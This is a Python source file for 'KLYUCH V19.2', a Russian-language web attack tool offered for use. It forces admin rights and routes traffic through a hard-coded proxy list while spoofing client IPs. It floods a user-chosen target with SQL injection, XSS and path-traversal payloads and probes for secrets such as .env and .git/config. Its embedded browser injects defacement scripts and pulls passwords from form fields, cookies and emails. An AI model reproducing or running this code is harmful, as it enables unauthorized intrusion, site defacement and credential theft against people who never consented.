# klyuch_v19_2.py
import ctypes
import sys
import os
import time
import requests
import random
import re
import json
import threading
import webbrowser
import hashlib
import tempfile
import shutil
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict
from urllib.parse import urlparse, urljoin, quote

# Отключаем предупреждения
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==================== ПРОВЕРКА ПРАВ АДМИНА ====================
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit(0)

if not is_admin():
    run_as_admin()

# ==================== ЦВЕТА ====================
class Colors:
    RED = '\033[91m'; GREEN = '\033[92m'; YELLOW = '\033[93m'
    BLUE = '\033[94m'; CYAN = '\033[96m'; MAGENTA = '\033[95m'
    END = '\033[0m'; BOLD = '\033[1m'

# ==================== ПРОКСИ МЕНЕДЖЕР ====================
class ProxyManager:
    PROXY_LIST = [
        "185.199.228.220:80", "20.111.54.16:8123", "138.68.60.8:3128",
        "159.65.77.168:8585", "188.166.211.99:8080", "167.71.5.83:3128",
        "134.209.29.120:8080", "157.245.97.63:80", "165.22.56.186:8080",
        "139.59.1.14:3128", "51.38.185.214:3128", "54.37.141.122:8800",
        "45.155.205.233:8080", "193.29.187.201:3128", "94.102.61.78:8080",
        "185.217.70.133:80", "185.130.5.253:80", "185.220.101.1:8080",
        "45.86.186.1:3128", "103.152.112.120:80", "47.88.67.145:3128",
        "13.250.45.98:8080", "54.169.98.147:80", "18.138.188.236:3128",
        "52.221.211.119:8080", "3.0.85.204:80", "13.212.65.13:3128",
        "54.254.157.196:8080", "47.74.152.29:8888", "45.77.175.112:8080"
    ]
    
    def __init__(self):
        self.working_proxies = []
        self.current_index = 0
    
    def test_proxy(self, proxy):
        try:
            proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
            r = requests.get("https://httpbin.org/ip", proxies=proxies, timeout=3, verify=False)
            return r.status_code == 200
        except:
            return False
    
    def get_working_proxies(self):
        print(f"{Colors.CYAN}[ПРОКСИ] Тестирование...{Colors.END}")
        working = []
        for proxy in self.PROXY_LIST:
            if self.test_proxy(proxy):
                working.append(proxy)
                print(f"{Colors.GREEN}  ✅ {proxy}{Colors.END}")
        self.working_proxies = working
        print(f"{Colors.GREEN}[ПРОКСИ] Найдено: {len(working)}{Colors.END}")
        return working
    
    def get_next(self):
        if not self.working_proxies:
            return None
        p = self.working_proxies[self.current_index % len(self.working_proxies)]
        self.current_index += 1
        return p

# ==================== ТАЙМЕР И ПРОГРЕСС ====================
class AttackTimer:
    def __init__(self, total_items):
        self.total = total_items
        self.completed = 0
        self.start_time = None
        self.lock = threading.Lock()
    
    def start(self):
        self.start_time = time.time()
    
    def update(self, completed):
        with self.lock:
            self.completed = completed
    
    def get_stats(self):
        with self.lock:
            if self.completed == 0 or self.start_time is None:
                return 0, 0, 0
            elapsed = time.time() - self.start_time
            avg_time = elapsed / self.completed
            remaining_items = self.total - self.completed
            remaining_time = remaining_items * avg_time
            percent = (self.completed / self.total) * 100
            return elapsed, remaining_time, percent
    
    def format_time(self, seconds):
        if seconds < 0:
            seconds = 0
        if seconds < 60:
            return f"{seconds:.1f}с"
        elif seconds < 3600:
            return f"{int(seconds//60)}м {int(seconds%60)}с"
        else:
            return f"{int(seconds//3600)}ч {int((seconds%3600)//60)}м"
    
    def draw_progress_bar(self, width=50):
        elapsed, remaining, percent = self.get_stats()
        filled = int(width * self.completed / self.total)
        bar = '█' * filled + '░' * (width - filled)
        return f"[{bar}] {percent:.1f}% | Осталось: {self.format_time(remaining)}"

# ==================== МОЩНЫЙ ДВИЖОК АТАК ====================
class UltraAttackEngine:
    def __init__(self, target, proxy_manager, threads=200):
        self.target = target.rstrip('/')
        self.proxy_manager = proxy_manager
        self.threads = min(max(threads, 50), 500)
        self.completed = 0
        self.successful = 0
        self.vulnerabilities = []
        self.lock = threading.Lock()
        self.results = []
        self.timer = None
    
    def generate_targets(self):
        targets = []
        # Пути для атаки
        paths = ["/admin", "/login", "/wp-admin", "/phpmyadmin", "/config.php", "/.env", "/backup.zip", 
                 "/robots.txt", "/admin/login.php", "/cpanel", "/info.php", "/.git/config", "/database.sql",
                 "/api", "/v1", "/swagger", "/graphql", "/panel", "/dashboard", "/backend"]
        for path in paths:
            targets.append(f"{self.target}{path}")
        
        # SQL инъекции
        for param in ["id", "page", "user"]:
            for payload in ["'", "' OR '1'='1", "1' AND SLEEP(5)"]:
                targets.append(f"{self.target}?{param}={quote(payload)}")
        
        # XSS
        for param in ["search", "q"]:
            for payload in ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]:
                targets.append(f"{self.target}?{param}={quote(payload)}")
        
        # LFI
        for param in ["page", "file"]:
            for file in ["/etc/passwd", "../../../config.php"]:
                targets.append(f"{self.target}?{param}={quote('../../../' + file)}")
        
        random.shuffle(targets)
        return targets[:self.threads]
    
    def attack(self, url, attack_id):
        proxy = self.proxy_manager.get_next()
        session = requests.Session()
        session.verify = False
        session.headers.update({"User-Agent": "Mozilla/5.0", "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"})
        if proxy:
            session.proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
        
        start = time.time()
        try:
            resp = session.get(url, timeout=5)
            elapsed = time.time() - start
            success = resp.status_code in [200, 403, 401]
            
            content = resp.text.lower()
            vulns = []
            if any(x in content for x in ['sql', 'mysql']): vulns.append("SQL")
            if any(x in content for x in ['admin', 'dashboard']): vulns.append("ADMIN")
            if any(x in content for x in ['<script>', 'alert']): vulns.append("XSS")
            if re.findall(r'password["\']?\s*[:=]\s*["\']([^"\']+)', resp.text): vulns.append("PASSWORD")
            
            return {"id": attack_id, "url": url, "status": resp.status_code, "time": round(elapsed, 3), 
                    "success": success, "vulns": vulns}
        except:
            return {"id": attack_id, "url": url, "status": "ERROR", "time": 0, "success": False}
    
    def run(self):
        print(f"\n{Colors.BOLD}{Colors.MAGENTA}{'='*65}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.RED}⚡ УЛЬТРА-МОЩНАЯ АТАКА ⚡{Colors.END}")
        print(f"{Colors.MAGENTA}{'='*65}{Colors.END}")
        print(f"{Colors.CYAN}🎯 ЦЕЛЬ: {self.target}{Colors.END}")
        print(f"{Colors.YELLOW}⚡ ПОТОКОВ: {self.threads}{Colors.END}")
        print(f"{Colors.MAGENTA}{'='*65}{Colors.END}\n")
        
        targets = self.generate_targets()
        self.timer = AttackTimer(len(targets))
        self.timer.start()
        
        print(f"{Colors.CYAN}⏱️  РАСЧЁТ ВРЕМЕНИ{Colors.END}")
        est_time = (len(targets) / self.threads) * 2
        print(f"{Colors.YELLOW}📊 ВСЕГО ЗАПРОСОВ: {len(targets)}{Colors.END}")
        print(f"{Colors.YELLOW}⏰ ПРИМЕРНОЕ ВРЕМЯ: {self.timer.format_time(est_time)}{Colors.END}\n")
        
        self.start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(self.attack, url, i) for i, url in enumerate(targets)]
            for future in as_completed(futures):
                result = future.result()
                self.results.append(result)
                with self.lock:
                    self.completed += 1
                    if result['success']:
                        self.successful += 1
                    for v in result.get('vulns', []):
                        if v not in self.vulnerabilities:
                            self.vulnerabilities.append(v)
                    self.timer.update(self.completed)
                    sys.stdout.write(f"\r{Colors.GREEN}[{self.completed}/{len(targets)}] {self.timer.draw_progress_bar(35)}{Colors.END}")
                    sys.stdout.flush()
        
        total_time = time.time() - self.start_time
        print(f"\n\n{Colors.BOLD}{Colors.GREEN}📊 СТАТИСТИКА{Colors.END}")
        print(f"{Colors.YELLOW}⏱️  Время: {self.timer.format_time(total_time)}{Colors.END}")
        print(f"{Colors.GREEN}✅ Успешно: {self.successful}/{len(targets)}{Colors.END}")
        print(f"{Colors.CYAN}⚡ Скорость: {len(targets)/total_time:.1f} запросов/сек{Colors.END}")
        if self.vulnerabilities:
            print(f"{Colors.RED}🔥 УЯЗВИМОСТЕЙ: {len(self.vulnerabilities)}{Colors.END}")
        return self.results

# ==================== HTML ОТЧЁТ ====================
def generate_report(target, results, engine, total_time):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    vuln_stats = defaultdict(int)
    found_urls = []
    for r in results:
        for v in r.get('vulns', []):
            vuln_stats[v] += 1
        if r['success']:
            found_urls.append(r)
    
    time_str = f"{int(total_time//60)}м {int(total_time%60)}с" if total_time > 60 else f"{total_time:.1f}с"
    
    html = f"""<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>KLYUCH V19.2 - ОТЧЁТ О ВЗЛОМЕ</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box;}}
body{{background:linear-gradient(135deg,#0a0a0a,#1a0000);color:#0f0;font-family:'Courier New',monospace;padding:20px;}}
.header{{background:#1a0000;border:2px solid #f00;border-radius:15px;padding:25px;text-align:center;margin-bottom:25px;}}
.header h1{{color:#f00;font-size:38px;text-shadow:0 0 10px #f00;}}
.target{{background:#000;padding:15px;border-radius:10px;margin-top:15px;word-break:break-all;}}
.stats-grid{{display:grid;grid-template-columns:repeat(5,1fr);gap:15px;margin-bottom:25px;}}
.stat-card{{background:rgba(0,0,0,0.7);border:1px solid #f00;border-radius:10px;padding:15px;text-align:center;transition:transform 0.3s;}}
.stat-card:hover{{transform:scale(1.05);box-shadow:0 0 20px rgba(255,0,0,0.3);}}
.stat-number{{font-size:36px;font-weight:bold;color:#f00;}}
.section{{background:rgba(0,0,0,0.5);border:1px solid #f00;border-radius:10px;margin-bottom:25px;overflow:hidden;}}
.section-title{{background:#1a0000;padding:12px;font-size:18px;font-weight:bold;color:#ff0;border-bottom:1px solid #f00;}}
table{{width:100%;border-collapse:collapse;}}
th,td{{padding:10px;text-align:left;border-bottom:1px solid #333;}}
th{{background:#1a0000;color:#f00;}}
tr:hover{{background:rgba(255,0,0,0.1);}}
.badge{{display:inline-block;padding:3px 8px;border-radius:5px;font-size:11px;margin:2px;}}
.badge-sql{{background:#f00;color:#fff;}}
.badge-admin{{background:#f0f;color:#fff;}}
.badge-xss{{background:#ff0;color:#000;}}
.badge-pass{{background:#0f0;color:#000;}}
.footer{{text-align:center;padding:20px;color:#666;border-top:1px solid #f00;margin-top:25px;}}
@keyframes glow{{0%{{box-shadow:0 0 5px #f00;}}100%{{box-shadow:0 0 20px #f00;}}}}
.glow{{animation:glow 1s infinite;}}
</style>
</head>
<body>
<div class="header glow"><h1>🔑 KLYUCH V19.2 - ULTIMATE EDITION 🔑</h1>
<div class="target">🎯 ЦЕЛЬ: {target}</div>
<div>📅 {timestamp} | ⏱️ ВРЕМЯ АТАКИ: {time_str}</div></div>
<div class="stats-grid">
<div class="stat-card"><div class="stat-number">{len(results)}</div><div>ВСЕГО</div></div>
<div class="stat-card"><div class="stat-number" style="color:#0f0;">{engine.successful}</div><div>УСПЕШНО</div></div>
<div class="stat-card"><div class="stat-number" style="color:#f00;">{len(results)-engine.successful}</div><div>НЕУДАЧ</div></div>
<div class="stat-card"><div class="stat-number">{len(vuln_stats)}</div><div>УЯЗВИМОСТЕЙ</div></div>
<div class="stat-card"><div class="stat-number">{len(results)/total_time:.1f}</div><div>ЗАПР/СЕК</div></div>
</div>
<div class="section"><div class="section-title">🔥 НАЙДЕННЫЕ УЯЗВИМОСТИ</div>"""
    
    vuln_names = {"SQL":"SQL-инъекция","ADMIN":"Админ-панель","XSS":"XSS","PASSWORD":"Пароль"}
    for v,c in vuln_stats.items():
        html += f'<div style="padding:10px;border-bottom:1px solid #333;"><span class="badge badge-{v.lower()}">{v}</span> {vuln_names.get(v,v)} — {c} раз(а)</div>'
    
    html += f"""</div>
<div class="section"><div class="section-title">🔓 НАЙДЕННЫЕ РЕСУРСЫ</div>
<table><tr><th>#</th><th>URL</th><th>Статус</th><th>Время</th><th>Уязвимости</th></tr>"""
    
    for i,r in enumerate(found_urls[:30],1):
        badges = ''.join(f'<span class="badge badge-{v.lower()}">{v}</span> ' for v in r.get('vulns',[]))
        html += f"<tr><td>{i}</td><td><a href='{r['url']}' target='_blank' style='color:#0f0;'>{r['url'][:70]}</a></td><td>{r['status']}</td><td>{r['time']}с</td><td>{badges}</td></tr>"
    
    html += f"""</table></div>
<div class="section"><div class="section-title">🛡️ БЕЗОПАСНОСТЬ</div>
<div style="padding:15px;">✅ Прокси: {len(engine.proxy_manager.working_proxies)} шт<br>✅ Анонимность: ПОЛНАЯ<br>✅ Ваш IP: СКРЫТ</div></div>
<div class="footer"><p>🔑 KLYUCH V19.2 - ULTIMATE STANDALONE EXE</p></div>
</body></html>"""
    
    filename = f"KLYUCH_REPORT_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
    with open(filename, "w", encoding="utf-8") as f:
        f.write(html)
    return filename

# ==================== ПРОВЕРКА PYQT ====================
try:
    from PyQt5.QtWidgets import *
    from PyQt5.QtCore import *
    from PyQt5.QtWebEngineWidgets import QWebEngineView
    from PyQt5.QtGui import QFont, QTextCursor
    PYQT_OK = True
except ImportError:
    PYQT_OK = False
    print("[!] PyQt5 не установлен. Установите: pip install PyQt5 PyQtWebEngine")

# ==================== ВИЗУАЛЬНЫЙ РЕДАКТОР ====================
if PYQT_OK:
    class VisualEditor(QMainWindow):
        def __init__(self, start_url, results_data=None):
            super().__init__()
            self.start_url = start_url
            self.results_data = results_data
            self.setWindowTitle(f"KLYUCH V19.2 - ВИЗУАЛЬНЫЙ РЕДАКТОР: {start_url}")
            self.setGeometry(50, 50, 1400, 900)
            self.setStyleSheet("""
                QMainWindow { background-color: #0a0a0a; }
                QToolBar { background-color: #1a0000; border-bottom: 2px solid #f00; }
                QLineEdit { background-color: #000; color: #0f0; border: 2px solid #f00; padding: 8px; font-size: 14px; border-radius: 5px; }
                QPushButton { background-color: #e74c3c; color: white; border: none; padding: 8px 15px; margin: 3px; border-radius: 5px; font-weight: bold; }
                QPushButton:hover { background-color: #c0392b; }
                QTextEdit { background-color: #000; color: #0f0; border: 1px solid #f00; font-family: monospace; font-size: 12px; }
                QLabel { color: #0f0; }
                QGroupBox { color: #0f0; border: 1px solid #f00; margin-top: 10px; border-radius: 5px; }
                QGroupBox::title { subcontrol-origin: margin; left: 10px; padding: 0 5px; }
                QTabWidget::pane { border: 1px solid #f00; background: #0a0a0a; }
                QTabBar::tab { background: #1a0000; color: #0f0; padding: 8px 15px; }
                QTabBar::tab:selected { background: #f00; color: #fff; }
            """)
            
            central = QWidget()
            self.setCentralWidget(central)
            main_layout = QHBoxLayout(central)
            main_layout.setSpacing(5)
            main_layout.setContentsMargins(5, 5, 5, 5)
            
            # Левая панель
            left = QWidget()
            left.setFixedWidth(450)
            left.setStyleSheet("background-color: #0a0a0a; border-right: 2px solid #f00;")
            left_layout = QVBoxLayout(left)
            left_layout.setSpacing(10)
            
            # Заголовок с анимацией
            title = QLabel("🔑 KLYUCH V19.2 - ULTIMATE EDITOR 🔑")
            title.setStyleSheet("font-size: 22px; font-weight: bold; color: #f00; padding: 10px; background: #1a0000; border-radius: 10px;")
            title.setAlignment(Qt.AlignCenter)
            left_layout.addWidget(title)
            
            # Вкладки
            tabs = QTabWidget()
            
            # Вкладка Редактирования
            edit_tab = QWidget()
            edit_layout = QVBoxLayout(edit_tab)
            
            # Навигация
            nav_group = QGroupBox("🌐 НАВИГАЦИЯ")
            nav_layout = QVBoxLayout(nav_group)
            url_layout = QHBoxLayout()
            url_layout.addWidget(QLabel("URL:"))
            self.url_bar = QLineEdit(start_url)
            self.url_bar.returnPressed.connect(self.navigate)
            url_layout.addWidget(self.url_bar)
            nav_layout.addLayout(url_layout)
            
            btn_layout = QHBoxLayout()
            for text, icon, slot in [("◀", "◀", self.back), ("▶", "▶", self.forward), ("🔄", "🔄", self.reload), ("🏠", "🏠", self.home)]:
                btn = QPushButton(icon)
                btn.setToolTip(text)
                btn.clicked.connect(slot)
                btn_layout.addWidget(btn)
            nav_layout.addLayout(btn_layout)
            edit_layout.addWidget(nav_group)
            
            # HTML редактор
            edit_group = QGroupBox("✏️ РЕДАКТОР КОДА")
            edit_edit_layout = QVBoxLayout(edit_group)
            self.html_edit = QTextEdit()
            self.html_edit.setPlaceholderText("""<div style='color:red; font-size:30px; text-align:center;'>САЙТ ВЗЛОМАН!</div>
<script>alert('KLYUCH V19.2');</script>""")
            self.html_edit.setMinimumHeight(120)
            edit_edit_layout.addWidget(self.html_edit)
            
            inject_btn = QPushButton("💉 ВНЕДРИТЬ НА САЙТ")
            inject_btn.setStyleSheet("background-color: #27ae60;")
            inject_btn.clicked.connect(self.inject)
            edit_edit_layout.addWidget(inject_btn)
            
            panel_btn = QPushButton("🔑 ВНЕДРИТЬ ПАНЕЛЬ УПРАВЛЕНИЯ")
            panel_btn.clicked.connect(self.inject_panel)
            edit_edit_layout.addWidget(panel_btn)
            
            alert_btn = QPushButton("⚠️ ВНЕДРИТЬ ALERT")
            alert_btn.clicked.connect(self.inject_alert)
            edit_edit_layout.addWidget(alert_btn)
            edit_layout.addWidget(edit_group)
            
            # Извлечение данных
            extract_group = QGroupBox("📊 ИЗВЛЕЧЕНИЕ ДАННЫХ")
            extract_layout = QVBoxLayout(extract_group)
            for text, slot in [("📧 EMAILS", self.extract_emails), ("🔑 ПАРОЛИ", self.extract_passwords), 
                               ("🔗 ССЫЛКИ", self.extract_links), ("🍪 COOKIES", self.extract_cookies)]:
                btn = QPushButton(text)
                btn.clicked.connect(slot)
                extract_layout.addWidget(btn)
            edit_layout.addWidget(extract_group)
            
            # Дополнительно
            extra_group = QGroupBox("🔧 ДОПОЛНИТЕЛЬНО")
            extra_layout = QVBoxLayout(extra_group)
            for text, slot in [("🎯 ПОИСК АДМИНКИ", self.find_admin), ("📸 СКРИНШОТ", self.screenshot), 
                               ("💾 СОХРАНИТЬ СТРАНИЦУ", self.save_page), ("🗑️ ОЧИСТИТЬ САЙТ", self.clear_site)]:
                btn = QPushButton(text)
                btn.clicked.connect(slot)
                extra_layout.addWidget(btn)
            edit_layout.addWidget(extra_group)
            
            edit_layout.addStretch()
            tabs.addTab(edit_tab, "✏️ РЕДАКТОР")
            
            # Вкладка Результатов атаки
            results_tab = QWidget()
            results_layout = QVBoxLayout(results_tab)
            self.results_text = QTextEdit()
            self.results_text.setReadOnly(True)
            self.results_text.setStyleSheet("font-size: 11px;")
            results_layout.addWidget(self.results_text)
            tabs.addTab(results_tab, "📊 РЕЗУЛЬТАТЫ АТАКИ")
            
            left_layout.addWidget(tabs)
            
            # Лог
            log_label = QLabel("📋 ЛОГ ДЕЙСТВИЙ:")
            left_layout.addWidget(log_label)
            self.log_text = QTextEdit()
            self.log_text.setReadOnly(True)
            self.log_text.setMaximumHeight(100)
            left_layout.addWidget(self.log_text)
            
            left_layout.addStretch()
            
            # Браузер
            self.browser = QWebEngineView()
            self.browser.setUrl(QUrl(start_url))
            self.browser.urlChanged.connect(self.url_changed)
            
            main_layout.addWidget(left)
            main_layout.addWidget(self.browser, 1)
            
            # Отображение результатов атаки
            if results_data:
                self.show_results(results_data)
            
            self.log("✅ ВИЗУАЛЬНЫЙ РЕДАКТОР ЗАПУЩЕН")
        
        def log(self, msg):
            timestamp = datetime.now().strftime("%H:%M:%S")
            self.log_text.append(f"[{timestamp}] {msg}")
        
        def url_changed(self, url):
            self.url_bar.setText(url.toString())
        
        def navigate(self):
            url = self.url_bar.text()
            if not url.startswith(("http://", "https://")):
                url = "https://" + url
            self.browser.setUrl(QUrl(url))
            self.log(f"Переход: {url}")
        
        def back(self): self.browser.back(); self.log("Назад")
        def forward(self): self.browser.forward(); self.log("Вперёд")
        def reload(self): self.browser.reload(); self.log("Обновление")
        def home(self): self.browser.setUrl(QUrl(self.start_url)); self.log(f"Домой")
        
        def inject(self):
            code = self.html_edit.toPlainText()
            if not code:
                self.log("❌ Введите код для внедрения")
                return
            js = f"document.body.insertAdjacentHTML('beforeend', `<div style='position:fixed;bottom:20px;right:20px;background:#000;color:#0f0;border:3px solid #0f0;border-radius:10px;padding:15px;z-index:999999;'>{code}</div>`);"
            self.browser.page().runJavaScript(js)
            self.log(f"✅ Код внедрён")
        
        def inject_panel(self):
            js = """
            var p=document.createElement('div');
            p.innerHTML='<div style="position:fixed;bottom:10px;right:10px;background:#000;color:#0f0;border:3px solid #0f0;border-radius:10px;padding:15px;z-index:999999;width:280px;"><b style="color:#f00;">🔑 KLYUCH V19.2 PANEL</b><br><input id="editText" placeholder="Новый текст..." style="width:100%;margin:5px 0;background:#111;color:#0f0;border:1px solid #0f0;"><br><button onclick="document.body.innerHTML+=document.getElementById(\'editText\').value" style="background:#0f0;color:#000;">✏️ ИЗМЕНИТЬ</button><button onclick="this.parentElement.parentElement.remove()" style="background:#f00;">❌</button><br><span style="font-size:10px;">ВЗЛОМАНО KLYUCH</span></div>';
            document.body.appendChild(p);
            """
            self.browser.page().runJavaScript(js)
            self.log("✅ Панель управления внедрена")
        
        def inject_alert(self):
            self.browser.page().runJavaScript("alert('🔑 KLYUCH V19.2 - САЙТ ВЗЛОМАН!');")
            self.log("✅ Alert внедрён")
        
        def extract_emails(self):
            js = "return document.body.innerText.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}/g) || []"
            self.browser.page().runJavaScript(js, lambda d: QMessageBox.information(self, "EMAILS", "\n".join(eval(d)[:30]) if d else "Не найдены"))
            self.log("📧 Извлечение email")
        
        def extract_passwords(self):
            js = "var p=[];document.querySelectorAll('input[type=password]').forEach(i=>{if(i.value)p.push(i.value)});return p"
            self.browser.page().runJavaScript(js, lambda d: QMessageBox.information(self, "ПАРОЛИ", "\n".join(eval(d)) if d else "Не найдены"))
            self.log("🔑 Поиск паролей")
        
        def extract_links(self):
            js = "return Array.from(document.querySelectorAll('a')).map(a=>a.href).slice(0,50)"
            self.browser.page().runJavaScript(js, lambda d: QMessageBox.information(self, "ССЫЛКИ", "\n".join(eval(d)[:30]) if d else "Не найдены"))
            self.log("🔗 Извлечение ссылок")
        
        def extract_cookies(self):
            js = "return document.cookie"
            self.browser.page().runJavaScript(js, lambda d: QMessageBox.information(self, "COOKIES", d or "Не найдены"))
            self.log("🍪 Извлечение cookies")
        
        def find_admin(self):
            self.browser.setUrl(QUrl(self.browser.url().toString().rstrip('/') + "/admin"))
            self.log("🎯 Поиск админ-панели")
        
        def screenshot(self):
            self.browser.grab().save("klyuch_screenshot.png")
            self.log("📸 Скриншот сохранён")
            QMessageBox.information(self, "Скриншот", "Сохранён как klyuch_screenshot.png")
        
        def save_page(self):
            js = "return document.documentElement.outerHTML"
            self.browser.page().runJavaScript(js, lambda h: open(f"klyuch_page_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html","w",encoding="utf-8").write(h))
            self.log("💾 Страница сохранена")
        
        def clear_site(self):
            self.browser.page().runJavaScript("document.body.innerHTML='<div style=\"text-align:center;margin-top:20%;\"><h1 style=\"color:#f00;\">🔑 САЙТ ВЗЛОМАН ЧЕРЕЗ KLYUCH V19.2 🔑</h1><p style=\"color:#0f0;\">KLYUCH ULTIMATE EDITION</p></div>';")
            self.log("🗑️ Сайт очищен")
        
        def show_results(self, results_data):
            text = "📊 РЕЗУЛЬТАТЫ АТАКИ\n" + "="*50 + "\n\n"
            for r in results_data[:50]:
                status_icon = "✅" if r['success'] else "❌"
                text += f"{status_icon} {r['url'][:60]} | {r['status']} | {r['time']}с\n"
                if r.get('vulns'):
                    text += f"   🔥 Уязвимости: {', '.join(r['vulns'])}\n"
            self.results_text.setText(text)

# ==================== ГЛАВНОЕ ПРИЛОЖЕНИЕ ====================
class KlyuchApp:
    def __init__(self):
        self.proxy_manager = ProxyManager()
        self.target = None
        self.threads = 200
        self.results = None
    
    def banner(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"""{Colors.RED}{Colors.BOLD}
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║     ██╗  ██╗██╗  ██╗██╗   ██╗██╗   ██╗ ██████╗██╗  ██╗                        ║
║     ██║ ██╔╝██║  ██║██║   ██║██║   ██║██╔════╝██║  ██║                        ║
║     █████╔╝ ███████║██║   ██║██║   ██║██║     ███████║                        ║
║     ██╔═██╗ ██╔══██║██║   ██║██║   ██║██║     ██╔══██║                        ║
║     ██║  ██╗██║  ██║╚██████╔╝╚██████╔╝╚██████╗██║  ██║                        ║
║     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝  ╚═════╝╚═╝  ╚═╝                        ║
║                                                                               ║
║                    K L Y U C H   V 1 9 . 2                                   ║
║                    ULTIMATE STANDALONE EXE                                   ║
║                                                                               ║
║         ⚡⚡⚡ ВСТРОЕННЫЙ БРАУЗЕР | АНИМАЦИИ | ТАЙМЕРЫ | МАКСИМАЛЬНАЯ МОЩНОСТЬ ⚡⚡⚡║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
{Colors.END}""")
    
    def run(self):
        self.banner()
        
        print(f"{Colors.BOLD}{Colors.GREEN}⚙️  НАСТРОЙКА УЛЬТРА-АТАКИ{Colors.END}")
        print(f"{Colors.CYAN}{'-'*55}{Colors.END}\n")
        
        self.target = input(f"{Colors.YELLOW}[?] Введите URL цели: {Colors.END}").strip()
        if not self.target.startswith(("http://", "https://")):
            self.target = "https://" + self.target
        
        print(f"\n{Colors.CYAN}[!] Мощность атаки:{Colors.END}")
        print(f"  {Colors.GREEN}1{Colors.END} - 100 потоков (стандарт)")
        print(f"  {Colors.GREEN}2{Colors.END} - 200 потоков (рекомендуется)")
        print(f"  {Colors.GREEN}3{Colors.END} - 350 потоков (мощная)")
        print(f"  {Colors.GREEN}4{Colors.END} - 500 потоков (максимум)")
        choice = input(f"{Colors.YELLOW}[?] Выбор (1-4): {Colors.END}").strip()
        choices = {'1': 100, '2': 200, '3': 350, '4': 500}
        self.threads = choices.get(choice, 200)
        
        print(f"\n{Colors.CYAN}[!] Прокси:{Colors.END}")
        if input(f"{Colors.YELLOW}[?] Использовать прокси? (y/n): {Colors.END}").lower() == 'y':
            self.proxy_manager.get_working_proxies()
        
        print(f"\n{Colors.GREEN}[ГОТОВО] Цель: {self.target}{Colors.END}")
        print(f"{Colors.GREEN}[ГОТОВО] Потоков: {self.threads}{Colors.END}")
        print(f"{Colors.GREEN}[ГОТОВО] Прокси: {len(self.proxy_manager.working_proxies)}{Colors.END}")
        
        input(f"\n{Colors.YELLOW}Нажмите Enter для ЗАПУСКА УЛЬТРА-АТАКИ...{Colors.END}")
        
        # Атака
        attack = UltraAttackEngine(self.target, self.proxy_manager, self.threads)
        results = attack.run()
        self.results = results
        
        # Отчёт
        total_time = time.time() - attack.start_time if hasattr(attack, 'start_time') else 0
        report_file = generate_report(self.target, results, attack, total_time)
        
        print(f"\n{Colors.GREEN}✅ ОТЧЁТ СОЗДАН: {report_file}{Colors.END}")
        
        print(f"\n{Colors.YELLOW}[!] Запустить ВИЗУАЛЬНЫЙ РЕДАКТОР С БРАУЗЕРОМ? (y/n){Colors.END}")
        if input().lower() == 'y':
            if PYQT_OK:
                qt_app = QApplication(sys.argv)
                editor = VisualEditor(self.target, results)
                webbrowser.open(report_file)
                editor.show()
                sys.exit(qt_app.exec_())
            else:
                print(f"{Colors.RED}[ОШИБКА] PyQt5 не установлен!{Colors.END}")
                print(f"{Colors.YELLOW}Установка: pip install PyQt5 PyQtWebEngine{Colors.END}")
                webbrowser.open(report_file)
        
        print(f"\n{Colors.GREEN}[ЗАВЕРШЕНО] Ультра-атака выполнена!{Colors.END}")
        input(f"\n{Colors.YELLOW}Нажмите Enter для выхода...{Colors.END}")

# ==================== ЗАПУСК ====================
if __name__ == "__main__":
    try:
        app = KlyuchApp()
        app.run()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Прервано{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}[ОШИБКА] {e}{Colors.END}")
        input("\nНажмите Enter...")
